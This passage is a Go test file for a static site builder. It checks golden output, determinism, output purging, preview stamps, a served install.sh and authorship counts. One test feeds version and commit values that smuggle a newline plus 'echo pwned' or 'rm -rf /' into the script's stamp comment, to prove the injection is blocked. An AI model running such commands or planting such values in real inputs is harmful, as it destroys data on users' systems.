package site

import (
	"encoding/json"
	"flag"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

var update = flag.Bool("update", false, "rewrite the golden files from this run's output")

// fixtureStamp is the injected build metadata. Every field is fixed so the
// golden files are a function of the fixture and nothing else — no clock, no
// commit hash, no version resolved at run time.
var fixtureStamp = BuildStamp{Version: "0.2.0", Commit: "abcdef1", GeneratedAt: "2026-02-11"}

// buildFixture renders the fixture repository into a fresh directory.
func buildFixture(t *testing.T, f *fixture, out string) Result {
	t.Helper()
	res, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: fixtureStamp})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	return res
}

// golden compares one output file against its committed copy.
func golden(t *testing.T, name string, got []byte) {
	t.Helper()
	path := filepath.Join("testdata", name)
	if *update {
		if err := os.MkdirAll("testdata", 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%s: %v (run `go test ./internal/core/site/ -update` to create it)", path, err)
	}
	if string(got) == string(want) {
		return
	}
	t.Errorf("%s differs from the golden file; run `go test ./internal/core/site/ -update` and read the diff", path)
	for i, line := range diffLines(string(want), string(got)) {
		if i > 12 {
			t.Errorf("  … and more")
			break
		}
		t.Errorf("  %s", line)
	}
}

// diffLines names the first lines that differ, so a failure says what changed
// rather than dumping two files.
func diffLines(want, got string) []string {
	w := strings.Split(want, "\n")
	g := strings.Split(got, "\n")
	var out []string
	for i := 0; i < len(w) || i < len(g); i++ {
		var a, b string
		if i < len(w) {
			a = w[i]
		}
		if i < len(g) {
			b = g[i]
		}
		if a == b {
			continue
		}
		out = append(out, "line "+itoa(i+1)+" want: "+clip120(a))
		out = append(out, "line "+itoa(i+1)+"  got: "+clip120(b))
		if len(out) > 26 {
			break
		}
	}
	return out
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

func clip120(s string) string {
	if len(s) > 120 {
		return s[:120] + "…"
	}
	return s
}

// TestBuildGolden pins the whole render: the composed landing page and the
// record export, byte for byte, over a repository this test built.
func TestBuildGolden(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	res := buildFixture(t, f, out)

	for _, name := range []string{"index.html", "record.json", "_redirects", "_headers", "site.css", "site.js"} {
		if !containsString(res.Files, name) {
			t.Errorf("build did not write %s: %v", name, res.Files)
		}
	}
	for _, name := range []string{"assets/img/intro.png", "assets/img/logo.png",
		"assets/img/role-thinker.png", "assets/img/role-facilitator.png"} {
		if !containsString(res.Files, name) {
			t.Errorf("build did not copy %s: %v", name, res.Files)
		}
	}

	html, err := os.ReadFile(filepath.Join(out, "index.html"))
	if err != nil {
		t.Fatal(err)
	}
	golden(t, "index.html", html)

	rec, err := os.ReadFile(filepath.Join(out, "record.json"))
	if err != nil {
		t.Fatal(err)
	}
	golden(t, "record.json", rec)
}

// TestBuildRendersTheInstallScript is the endpoint itd-138 buys: `/install.sh`
// is the committed template and nothing else. The build may stamp it, because a
// reader who downloads a script is entitled to know which build wrote it, but
// the stamp is a COMMENT — every executable byte is the reviewed file's.
//
// So the assertion is byte equality after the stamp line is removed, not a
// resemblance check: a render that reformatted, substituted or truncated a
// single character of the script would pass a looser test and ship a command
// nobody reviewed.
func TestBuildRendersTheInstallScript(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	res := buildFixture(t, f, out)

	if !containsString(res.Files, "install.sh") {
		t.Fatalf("the build wrote no install.sh: %v", res.Files)
	}
	got := outFile(t, out, "install.sh")
	tmpl, err := os.ReadFile(filepath.Join(f.Root(), "site-src", "install.sh.tmpl"))
	if err != nil {
		t.Fatal(err)
	}

	lines := strings.Split(got, "\n")
	if len(lines) < 2 {
		t.Fatalf("the emitted install.sh is %d lines long", len(lines))
	}
	if !strings.HasPrefix(lines[0], "#!") {
		t.Errorf("the emitted install.sh does not open with a shebang: %q", lines[0])
	}
	// The stamp names the build: the same version and commit the footer carries.
	stampLine := lines[1]
	if !strings.HasPrefix(stampLine, "#") {
		t.Fatalf("the line after the shebang is not a comment: %q", stampLine)
	}
	for _, want := range []string{fixtureStamp.Version, fixtureStamp.Commit} {
		if !strings.Contains(stampLine, want) {
			t.Errorf("the build stamp %q does not name %q", stampLine, want)
		}
	}

	// Everything else is the template, byte for byte.
	rest := append([]string{lines[0]}, lines[2:]...)
	if body := strings.Join(rest, "\n"); body != string(tmpl) {
		t.Errorf("the emitted install.sh is not the template plus a stamp comment:\n%s",
			strings.Join(diffLines(string(tmpl), body), "\n"))
	}

	// And it is still a script the shell will read. A stamp inserted in the wrong
	// place is a syntax error the agreement test cannot see.
	assertParsesAsShell(t, filepath.Join(out, "install.sh"))
}

// TestBuildWithoutAnInstallTemplate is the graceful half: a repository that
// commits no installer is a repository with no /install.sh, not a failed build.
//
// And the page must agree with the tree. Offering a link is the build's promise
// that the route is there; a repository with no template emits no route, so a
// link to it would be a dead one — on the single page whose job is to be worth
// trusting with a command that pipes a download into a shell.
func TestBuildWithoutAnInstallTemplate(t *testing.T) {
	f := newFixture(t)
	if err := os.Remove(filepath.Join(f.Root(), "site-src", "install.sh.tmpl")); err != nil {
		t.Fatal(err)
	}
	out := t.TempDir()
	res := buildFixture(t, f, out)
	if containsString(res.Files, "install.sh") {
		t.Errorf("the build invented an install.sh with no template: %v", res.Files)
	}
	if html := outFile(t, out, "index.html"); strings.Contains(html, "/install.sh") {
		t.Error("the landing page links /install.sh, which this build did not write")
	}
}

// TestInstallScriptWithoutAStampIsAVerbatimCopy pins the no-stamp path, which no
// fixture build can reach: the build fills an empty stamp from the changelog and
// from git HEAD, so a repository with neither is the only caller that sees this,
// and it must get the template back unchanged rather than a comment reading
// "built from ".
func TestInstallScriptWithoutAStampIsAVerbatimCopy(t *testing.T) {
	tmpl := []byte("#!/bin/sh\nmain() { :; }\nmain \"$@\"\n")
	if got := renderInstallScript(tmpl, BuildStamp{}); string(got) != string(tmpl) {
		t.Errorf("an unstamped render changed the script:\n got %q\nwant %q", got, tmpl)
	}
}

// TestInstallScriptStampCannotAddALine is the one thing the stamp must never
// do. The comment is built from two strings — a changelog heading and a git
// object name — and a newline in either would END the comment and make what
// follows a COMMAND, in a file whose whole purpose is to be piped into a shell.
//
// The fields are repository facts rather than attacker input, which is exactly
// why this is worth a test: nothing else in the build would notice, and the
// result is served to every reader who trusts the domain.
func TestInstallScriptStampCannotAddALine(t *testing.T) {
	tmpl := []byte("#!/bin/sh\nset -eu\nmain() { :; }\nmain \"$@\"\n")
	hostile := []BuildStamp{
		{Version: "0.1\necho pwned", Commit: "abc123"},
		{Version: "0.1", Commit: "abc123\nrm -rf /"},
		{Version: "0.1\r\necho pwned", Commit: "abc123"},
	}
	for _, stamp := range hostile {
		got := string(renderInstallScript(tmpl, stamp))
		if strings.Count(got, "\n") != strings.Count(string(tmpl), "\n")+1 {
			t.Errorf("stamp %+v added more than one line:\n%q", stamp, got)
		}
		for _, banned := range []string{"echo pwned", "rm -rf"} {
			if strings.Contains(got, banned) {
				t.Errorf("stamp %+v put %q into the served script:\n%q", stamp, banned, got)
			}
		}
	}
}

// assertParsesAsShell runs the shell's own parser over a file. `sh -n` reads the
// whole script and executes none of it, which is exactly the question: is what
// the build wrote still a script?
func assertParsesAsShell(t *testing.T, path string) {
	t.Helper()

	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skipf("no sh on PATH: %v", err)
	}
	out, err := exec.Command(sh, "-n", path).CombinedOutput()
	if err != nil {
		t.Errorf("sh -n %s: %v\n%s", filepath.Base(path), err, out)
	}
}

// TestInstallStripLinksTheServedScript is itd-138's fifth criterion: a reader
// looking at a command that pipes a download into a shell can read the download
// first, from the page that is offering it.
//
// A link that exists but is not beside the command is not the criterion, so the
// assertion is positional: the link sits inside the operating-system panel that
// shows the command, not in the footer or the release row.
func TestInstallStripLinksTheServedScript(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	buildFixture(t, f, out)
	html := outFile(t, out, "index.html")

	link := `<a href="/install.sh">read the script</a>`
	if !strings.Contains(html, link) {
		t.Errorf("the landing page carries no read-the-script link (%s)", link)
	}

	// Beside the command: inside the panel, after the block that holds it.
	panel := sectionBetween(html, `<div role="tabpanel" id="panel-macos"`, `<div role="tabpanel" id="panel-linux"`)
	if panel == "" {
		t.Fatal("the landing page has no macOS install panel")
	}
	cmd := strings.Index(panel, `<div class="cmd">`)
	at := strings.Index(panel, link)
	switch {
	case cmd < 0:
		t.Fatal("the macOS install panel shows no command")
	case at < 0:
		t.Error("the read-the-script link is not in the panel that shows the command")
	case at < cmd:
		t.Error("the read-the-script link comes before the command it reads")
	}

	// And the releases link the manual path needs stays on the strip.
	if !strings.Contains(html, `<a href="https://example.invalid/fixture/repo/releases">all releases</a>`) {
		t.Error("the install strip lost its releases link, so the by-hand path has no destination")
	}
}

// sectionBetween returns the span of s that opens at from and ends where to
// begins, or "" when either marker is missing.
func sectionBetween(s, from, to string) string {
	i := strings.Index(s, from)
	if i < 0 {
		return ""
	}
	rest := s[i:]
	if j := strings.Index(rest, to); j >= 0 {
		return rest[:j]
	}
	return rest
}

// TestBuildLayoutDoesNotOverlap is the packing's own sanity check, asserted
// rather than reported: a bubble sitting on top of another means the placement
// walked into a case it does not handle, and the chart is wrong. The count the
// build publishes covers BOTH arrangements — it was the coil's alone, and an
// overlapping by-links picture shipped green behind it — so the assertion is
// re-derived here from each arrangement in turn.
func TestBuildLayoutDoesNotOverlap(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	res := buildFixture(t, f, out)
	if res.Overlaps != 0 {
		t.Fatalf("the packing overlaps: %d", res.Overlaps)
	}

	var export RecordExport
	if err := json.Unmarshal([]byte(outFile(t, out, "record.json")), &export); err != nil {
		t.Fatalf("record.json: %v", err)
	}
	l := export.Layout
	coil := countOverlaps(l.Coil, l.Radius, l.CoilRadius)
	links := countOverlaps(l.Links, l.Radius, l.CoilRadius)
	if coil != 0 || links != 0 {
		t.Errorf("published layout overlaps: coil %d, by-links %d", coil, links)
	}
	if l.Overlaps != coil+links {
		t.Errorf("published count %d does not measure both arrangements (coil %d + by-links %d)",
			l.Overlaps, coil, links)
	}
}

// previewStamp is a preview build's metadata: a commit and a date, and no
// version, because that is the whole point of the mode.
var previewStamp = BuildStamp{Commit: "abcdef1", GeneratedAt: "2026-02-11", Preview: true}

// TestPreviewStampSaysUnreleased is adr-48 decision 3's honesty requirement.
//
// A preview is built from main, which is ahead of the newest release. With the
// version falling back to the CHANGELOG heading, every preview stamped itself
// with a release it is not — a build claiming a provenance that belongs to a
// tagged commit somebody could go and verify. The preview says what it actually
// is: unreleased, at this commit.
func TestPreviewStampSaysUnreleased(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	res, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: previewStamp})
	if err != nil {
		t.Fatalf("build: %v", err)
	}

	if res.Version != "" {
		t.Errorf("a preview build reports version %q, want none", res.Version)
	}

	// The landing page's footer stamp.
	foot := sectionBetween(outFile(t, out, "index.html"), `<span class="mono small foot-meta">`, `</span></span>`)
	if foot == "" {
		t.Fatal("the landing page has no build stamp")
	}
	if !strings.Contains(foot, "unreleased") {
		t.Errorf("the preview footer stamp does not say unreleased: %q", foot)
	}
	if !strings.Contains(foot, previewStamp.Commit) {
		t.Errorf("the preview footer stamp does not carry the commit: %q", foot)
	}
	if strings.Contains(foot, "v"+fixtureStamp.Version) {
		t.Errorf("the preview footer stamp claims a released version: %q", foot)
	}

	// The explorer pages carry no dateline of their own: the header pill and
	// the footer stamp are the two renderers of the build fact, and a third
	// under every page title was the same numbers a third time.
	if strings.Contains(outFile(t, out, "record/index.html"), `<p class="gen">`) {
		t.Error("the explorer dashboard still renders a gen dateline under its title")
	}

	// And the export the chart reads.
	var export struct {
		Build BuildStamp `json:"build"`
	}
	if err := json.Unmarshal([]byte(outFile(t, out, "record.json")), &export); err != nil {
		t.Fatal(err)
	}
	if !export.Build.Preview {
		t.Error("record.json does not mark the build as a preview")
	}
	if export.Build.Version != "" {
		t.Errorf("record.json carries version %q on a preview build", export.Build.Version)
	}
	if export.Build.Commit != previewStamp.Commit {
		t.Errorf("record.json carries commit %q, want %q", export.Build.Commit, previewStamp.Commit)
	}
}

// TestPreviewRefusesAPinnedVersion holds the two flags apart. They are opposite
// instructions — "stamp this exact version" and "stamp no version at all" — and
// a build that silently honoured one would produce the other's output under the
// other's name. The refusal is the only honest answer.
func TestPreviewRefusesAPinnedVersion(t *testing.T) {
	f := newFixture(t)
	_, err := Build(Request{RepoRoot: f.Root(), OutDir: t.TempDir(),
		Stamp: BuildStamp{Version: "9.9.9", Commit: "abcdef1", Preview: true}})
	if err == nil {
		t.Fatal("a preview build accepted a pinned version")
	}
	for _, want := range []string{"preview", "version"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not name %q: %v", want, err)
		}
	}
}

// TestPreviewBuildIsDeterministic keeps the preview on the same footing as every
// other build: the shape chosen for the export — an empty version field beside
// `preview: true`, rather than an omitted one — must render the same bytes twice.
func TestPreviewBuildIsDeterministic(t *testing.T) {
	f := newFixture(t)
	a, b := t.TempDir(), t.TempDir()
	for _, out := range []string{a, b} {
		if _, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: previewStamp}); err != nil {
			t.Fatalf("build: %v", err)
		}
	}
	for _, name := range []string{"index.html", "record.json", "record/index.html"} {
		if outFile(t, a, name) != outFile(t, b, name) {
			t.Errorf("%s differs between two preview builds of the same tree", name)
		}
	}
}

// TestBuildIsDeterministic builds the same tree twice into two directories and
// diffs every byte. It is the property the published site rests on: production
// is rendered from a tag, and a build that is not a function of its input cannot
// be checked against the tree it claims to describe.
// TestBuildPurgesItsOwnOutput is the bug this file's marker exists to close.
//
// The output directory is a RENDER of the tree, not an accumulation of them. A
// build that writes into a directory an older build left behind produces a tree
// that is partly this commit and partly some previous one, and every check that
// follows — the header walk, the agreement test, a reader verifying the served
// install.sh against the repository — is then run against a mixture. The stale
// file is served, and nothing says so: it looks exactly like a file that built.
func TestBuildPurgesItsOwnOutput(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	buildFixture(t, f, out)

	// A file from an "earlier build" that this build has no reason to write.
	stale := filepath.Join(out, "record", "adr", "adr-99", "index.html")
	if err := os.MkdirAll(filepath.Dir(stale), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(stale, []byte("<!-- a record that no longer exists -->"), 0o644); err != nil {
		t.Fatal(err)
	}
	staleRoot := filepath.Join(out, "install.sh")
	if err := os.WriteFile(staleRoot, []byte("#!/bin/sh\n# an older stamp\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	res := buildFixture(t, f, out)

	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Errorf("a record page from an earlier build survived into the new tree: %s", stale)
	}
	// The rebuilt install.sh must be this build's, not the one left lying there.
	if got := outFile(t, out, "install.sh"); strings.Contains(got, "an older stamp") {
		t.Error("the stale install.sh survived the rebuild")
	}
	// And what is on disk is exactly what the build says it wrote.
	var onDisk []string
	err := filepath.Walk(out, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		rel, err := filepath.Rel(out, p)
		if err != nil {
			return err
		}
		onDisk = append(onDisk, filepath.ToSlash(rel))
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(onDisk) != len(res.Files) {
		t.Errorf("the tree holds %d files but the build reported writing %d", len(onDisk), len(res.Files))
	}
}

// TestBuildRefusesADirectoryItDidNotWrite is the other half, and the reason the
// purge is safe to have at all.
//
// Emptying a directory is not an operation to perform on a guess. `--out` takes
// a path from a person, and the paths people mistype are their own — a source
// tree, a home directory, the repository root. So the build removes nothing it
// cannot first prove it wrote, and says so rather than proceeding.
func TestBuildRefusesADirectoryItDidNotWrite(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()

	precious := filepath.Join(out, "not-ours.txt")
	if err := os.WriteFile(precious, []byte("someone else's work"), 0o644); err != nil {
		t.Fatal(err)
	}

	_, err := Build(Request{RepoRoot: f.Root(), OutDir: out, Stamp: fixtureStamp})
	if err == nil {
		t.Fatal("the build emptied a directory it had never written")
	}
	for _, want := range []string{"cannot tell it apart", "refusing"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not say %q: %v", want, err)
		}
	}
	if !strings.Contains(err.Error(), siteMarkerName) {
		t.Errorf("the refusal does not name the marker it looked for: %v", err)
	}
	// Refusing means refusing: nothing was touched.
	got, err := os.ReadFile(precious)
	if err != nil || string(got) != "someone else's work" {
		t.Errorf("the refused build damaged the directory anyway: %q, %v", got, err)
	}
	entries, err := os.ReadDir(out)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Errorf("the refused build left %d entries behind, want the 1 that was there", len(entries))
	}
}

// TestBuildMarksItsOutput pins the marker itself: it is written, and it says
// what it is for. A marker whose text did not explain itself would be a stray
// dotfile in somebody's build output, and the first reasonable thing to do with
// one of those is delete it — which is precisely what turns the next build into
// a refusal.
//
// That it is written FIRST is not asserted here, because `Result.Files` is
// sorted and the marker sorts to the front regardless: an assertion on it would
// pin the alphabet, not the order of writes. The reason for the order is in
// build.go, where the write happens.
func TestBuildMarksItsOutput(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	res := buildFixture(t, f, out)

	if !containsString(res.Files, siteMarkerName) {
		t.Errorf("the build did not report writing %s: %v", siteMarkerName, res.Files)
	}
	want := string(siteMarker(f.gitOut("rev-list", "--max-parents=0", "HEAD")))
	if body := outFile(t, out, siteMarkerName); body != want {
		t.Errorf("the marker reads %q, want %q", body, want)
	}
}

// TestBuildClearsTheWreckageOfAFailedBuild is the property the write ORDER buys.
//
// A build that dies partway leaves a non-empty directory. If the marker were
// written at the end, that directory would carry no marker, and every later
// build would refuse it — the tool would have jammed itself on its own debris
// and could only be freed by hand. Writing the marker first means a half-written
// tree is still recognisably ours.
func TestBuildClearsTheWreckageOfAFailedBuild(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()

	// The wreckage a killed build leaves: the marker, and some of the tree.
	marker := siteMarker(f.gitOut("rev-list", "--max-parents=0", "HEAD"))
	if err := os.WriteFile(filepath.Join(out, siteMarkerName), marker, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(out, "index.html"), []byte("<!-- half a page"), 0o644); err != nil {
		t.Fatal(err)
	}

	res := buildFixture(t, f, out)
	if got := outFile(t, out, "index.html"); strings.Contains(got, "half a page") {
		t.Error("the half-written page survived the next build")
	}
	if !containsString(res.Files, siteMarkerName) {
		t.Error("the rebuild did not leave the marker in place")
	}
}

// TestPurgeKeepsTheMarker closes a window the purge would otherwise open.
//
// `os.ReadDir` returns names in order, and `.abcd-site-build` sorts before
// everything else — so a purge that removed the marker like any other entry
// would remove it FIRST. Interrupted anywhere after that (a killed process, a
// full disk, a permission error partway through), it leaves a non-empty
// directory that no longer identifies itself, and every later build refuses it.
// The tool would jam on its own wreckage, and the only way out would be to
// delete the directory by hand — the exact outcome the marker exists to prevent.
//
// So the marker survives the purge and is rewritten in place with identical
// bytes. It is present at every instant.
func TestPurgeKeepsTheMarker(t *testing.T) {
	out := t.TempDir()
	const identity = "0123456789abcdef0123456789abcdef01234567"
	if err := os.WriteFile(filepath.Join(out, siteMarkerName), siteMarker(identity), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"index.html", "site.css"} {
		if err := os.WriteFile(filepath.Join(out, name), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.MkdirAll(filepath.Join(out, "record", "adr"), 0o755); err != nil {
		t.Fatal(err)
	}

	root, err := openOutDir(out)
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	if err := purgeOutDir(root); err != nil {
		t.Fatal(err)
	}

	entries, err := os.ReadDir(out)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 || entries[0].Name() != siteMarkerName {
		var got []string
		for _, e := range entries {
			got = append(got, e.Name())
		}
		t.Errorf("after the purge the directory holds %v, want just %s", got, siteMarkerName)
	}

	// And the directory still reads as ours, at every point in between.
	state, err := inspectOutDir(out, identity)
	if err != nil {
		t.Fatal(err)
	}
	if state != outDirOurs {
		t.Errorf("a purged directory no longer identifies itself as ours: state %d", state)
	}
}

// TestRebuildingInPlaceIsByteIdentical is determinism's other half. The existing
// determinism test builds into two fresh directories; this one builds twice into
// ONE, which is what a person actually does, and is the case the purge changes.
func TestRebuildingInPlaceIsByteIdentical(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()

	first := buildFixture(t, f, out)
	snapshot := map[string]string{}
	for _, name := range first.Files {
		snapshot[name] = outFile(t, out, name)
	}

	second := buildFixture(t, f, out)
	if len(second.Files) != len(first.Files) {
		t.Fatalf("rebuilding in place wrote %d files, the first build wrote %d", len(second.Files), len(first.Files))
	}
	for _, name := range second.Files {
		was, ok := snapshot[name]
		if !ok {
			t.Errorf("rebuilding in place invented %s", name)
			continue
		}
		if now := outFile(t, out, name); now != was {
			t.Errorf("%s differs between two builds into the same directory", name)
		}
	}
}

func TestBuildIsDeterministic(t *testing.T) {
	f := newFixture(t)
	a, b := t.TempDir(), t.TempDir()
	ra := buildFixture(t, f, a)
	rb := buildFixture(t, f, b)
	if len(ra.Files) != len(rb.Files) {
		t.Fatalf("two builds wrote different files: %v vs %v", ra.Files, rb.Files)
	}
	for _, name := range ra.Files {
		x, err := os.ReadFile(filepath.Join(a, filepath.FromSlash(name)))
		if err != nil {
			t.Fatal(err)
		}
		y, err := os.ReadFile(filepath.Join(b, filepath.FromSlash(name)))
		if err != nil {
			t.Fatal(err)
		}
		if string(x) != string(y) {
			t.Errorf("%s differs between two builds of the same tree", name)
		}
	}
}

// TestBuildRecordExportShape asserts the facts the export is FOR, so a change
// that silently drops one is caught by something other than the golden diff.
func TestBuildRecordExportShape(t *testing.T) {
	f := newFixture(t)
	out := t.TempDir()
	buildFixture(t, f, out)
	data, err := os.ReadFile(filepath.Join(out, "record.json"))
	if err != nil {
		t.Fatal(err)
	}
	var exp RecordExport
	if err := json.Unmarshal(data, &exp); err != nil {
		t.Fatal(err)
	}

	if exp.SchemaVersion != 1 {
		t.Errorf("schema_version: %d", exp.SchemaVersion)
	}
	if len(exp.Nodes) != 13 {
		t.Fatalf("nodes: %d, want 13 (3 adrs, 6 intents, 1 spec, 1 issue, 2 principles)", len(exp.Nodes))
	}
	// The principle store carries no frontmatter, so nothing in the lint scan
	// can see it; the file name is the handle and the H1 is the title. The
	// store's own README is its index, not one of its records.
	if got := exp.Counts.ByType["principle"]; got != 2 {
		t.Errorf("principles: %d, want 2 (the README is the store's index)", got)
	}
	byID := map[string]ExportNode{}
	for _, n := range exp.Nodes {
		byID[n.ID] = n
	}
	// The shipped intent was moved into shipped/ in its own commit; that move is
	// the only record of the day it shipped.
	if got := byID["itd-2"].Dates.Entered; got != "2026-02-10" {
		t.Errorf("itd-2 entered shipped/: %q, want 2026-02-10", got)
	}
	if got := byID["itd-2"].Dates.Created; got != "2026-01-05" {
		t.Errorf("itd-2 created: %q", got)
	}
	// A record with no frontmatter date is dated from git; one with a date keeps
	// its own.
	if got := byID["adr-1"].Date; got != "2026-01-02" {
		t.Errorf("adr-1 effective date: %q", got)
	}
	if got := byID["itd-2"].Date; got != "2026-01-05" {
		t.Errorf("itd-2 effective date: %q", got)
	}

	// The intent↔spec link is declared from both ends and must render once.
	implements := 0
	for _, e := range exp.Edges {
		if e.Rel == "implements" {
			implements++
			if e.From != "spc-1" || e.To != "itd-2" {
				t.Errorf("implements edge points the wrong way: %+v", e)
			}
		}
	}
	if implements != 1 {
		t.Errorf("implements edges: %d, want 1 (the mirrored pair collapses)", implements)
	}
	// So must the `related` pair adr-1 ↔ adr-2, which both files record.
	adrPair := 0
	for _, e := range exp.Edges {
		if e.Rel != "related" {
			continue
		}
		if (e.From == "adr-1" && e.To == "adr-2") || (e.From == "adr-2" && e.To == "adr-1") {
			adrPair++
		}
	}
	if adrPair != 1 {
		t.Errorf("adr-1 ↔ adr-2 related edges: %d, want 1 (both files record it)", adrPair)
	}

	// The dangling supersession is measured and listed, and it is the one the
	// committed baseline admits.
	if len(exp.Health.Unresolved) != 1 || exp.Health.Unresolved[0].To != "adr-9" {
		t.Errorf("unresolved: %+v", exp.Health.Unresolved)
	}
	if exp.Health.BaselineCount != 1 {
		t.Errorf("baseline count: %d", exp.Health.BaselineCount)
	}

	// A body mention is carried, and never where a typed link already is.
	if len(exp.Mentions) == 0 {
		t.Error("no body mentions recorded")
	}
	for _, m := range exp.Mentions {
		for _, e := range exp.Edges {
			if (m.From == e.From && m.To == e.To) || (m.From == e.To && m.To == e.From) {
				t.Errorf("mention duplicates a typed link: %+v", m)
			}
		}
	}

	if len(exp.Releases) != 2 || exp.Releases[0].Version != "0.2.0" || exp.Releases[0].Date != "2026-02-11" {
		t.Errorf("releases: %+v", exp.Releases)
	}
	// A record that entered the trunk only inside a merge commit is dated like
	// any other. `git log --name-status` prints no file lines for a merge, so
	// without --diff-merges this record is invisible to the walk entirely and
	// ships with three empty dates — which then takes the centre of the coil.
	adr3 := byID["adr-3"]
	if adr3.Dates.Created == "" || adr3.Dates.Entered == "" || adr3.Dates.Touched == "" {
		t.Errorf("adr-3 entered the trunk in a merge and the walk did not see it: %+v", adr3.Dates)
	}
	if adr3.Dates.Created != "2026-03-05" {
		t.Errorf("adr-3 created: %q, want 2026-03-05", adr3.Dates.Created)
	}
	for _, n := range exp.Nodes {
		if n.Date == "" {
			t.Errorf("%s carries no effective date; nothing can place it in time", n.ID)
		}
	}
	if exp.Layout.DateRange[0] == "" {
		t.Errorf("the published date span begins at the empty string: %v", exp.Layout.DateRange)
	}

	if exp.Counts.ByType["adr"] != 3 || exp.Counts.ByType["intent"] != 6 ||
		exp.Counts.ByType["spec"] != 1 || exp.Counts.ByType["issue"] != 1 {
		t.Errorf("counts: %+v", exp.Counts.ByType)
	}
	if exp.Counts.ByLifecycle["intent"]["shipped"] != 3 || exp.Counts.ByLifecycle["intent"]["drafts"] != 1 ||
		exp.Counts.ByLifecycle["intent"]["disciplines"] != 1 || exp.Counts.ByLifecycle["intent"]["superseded"] != 1 {
		t.Errorf("lifecycle counts: %+v", exp.Counts.ByLifecycle)
	}
	// A FLAT store grades its records in frontmatter rather than by moving them,
	// so its whole shape is in the status counts. A page reading only the
	// lifecycle would show the decisions as one undifferentiated block.
	if exp.Counts.ByStatus["adr"]["accepted"] != 3 {
		t.Errorf("status counts: %+v", exp.Counts.ByStatus)
	}

	// Attribution: one commit declared a model, the rest declared None or
	// nothing at all — and the export says so rather than guessing.
	if exp.Authorship.Assisted != 1 {
		t.Errorf("assisted trailer occurrences: %d, want 1", exp.Authorship.Assisted)
	}
	// The changelog commit, the merge fixture's BRANCH commit, and the commit
	// that ships the stub — each declaring that no tool touched it. The merge
	// commit's own declaration is not among them: a merge is authored by nobody,
	// so it is counted as a merge and asked to declare nothing.
	if exp.Authorship.DeclaredNone != 3 {
		t.Errorf("declared-None authored commits: %d, want 3", exp.Authorship.DeclaredNone)
	}
	if exp.Authorship.Merges == 0 {
		t.Error("no merges counted — the fixture history has one, so the exclusion is untested")
	}
	if exp.Authorship.Commits != exp.Authorship.Authored+exp.Authorship.Merges {
		t.Errorf("commits %d != authored %d + merges %d",
			exp.Authorship.Commits, exp.Authorship.Authored, exp.Authorship.Merges)
	}
	if len(exp.Authorship.Humans) != 1 || exp.Authorship.Humans[0].Name != "Fixture" {
		t.Errorf("humans: %+v", exp.Authorship.Humans)
	}
	if len(exp.Authorship.Bots) != 0 {
		t.Errorf("bots: %+v — the fixture's only author is a person", exp.Authorship.Bots)
	}
	// None is a declaration of no assistance, so it is not a row in a tally of
	// what assisted: the chart would otherwise sum past its own total.
	if len(exp.Authorship.ByModel) != 1 {
		t.Errorf("by_model: %+v, want the declared model alone", exp.Authorship.ByModel)
	}
}

// TestAuthorshipSeparatesToolsFromPeople pins the derived bots-and-tools row: a
// forge bot is recognised by the suffix the forge itself gives it, and a
// pre-policy commit authored by the tool is recognised because the repository's
// own trailers name that vendor as an assistant.
func TestAuthorshipSeparatesToolsFromPeople(t *testing.T) {
	f := newFixture(t)
	f.write("bot.txt", "a dependency bump\n")
	f.git("2026-03-03T09:00:00+00:00", "add", "-A")
	f.git("2026-03-03T09:00:00+00:00",
		"-c", "user.name=depbot[bot]", "-c", "user.email=depbot@example.invalid",
		"commit", "-m", "chore: bump a dependency")
	f.write("tool.txt", "a pre-policy commit\n")
	f.git("2026-03-04T09:00:00+00:00", "add", "-A")
	f.git("2026-03-04T09:00:00+00:00",
		"-c", "user.name=Assistant", "-c", "user.email=noreply@example.invalid",
		"commit", "-m", "chore: written before the trailer convention")
	f.write("human.txt", "a commit from a forge noreply address\n")
	f.git("2026-03-05T09:00:00+00:00", "add", "-A")
	f.git("2026-03-05T09:00:00+00:00",
		"-c", "user.name=Casey", "-c", "user.email=1234+casey@users.noreply.github.com",
		"commit", "-m", "docs: a change by a person")

	a, err := LoadAuthorship(f.Root())
	if err != nil {
		t.Fatal(err)
	}
	// A merge is nobody's work: it never counts toward the disclosure rate, in
	// either the numerator or the denominator. A commit declaring two models is
	// ONE commit and TWO trailer occurrences, and the two quantities are kept
	// apart — conflating them is what published a disclosure rate 24 points
	// below the truth.
	if a.Commits != a.Authored+a.Merges {
		t.Errorf("commits %d != authored %d + merges %d", a.Commits, a.Authored, a.Merges)
	}
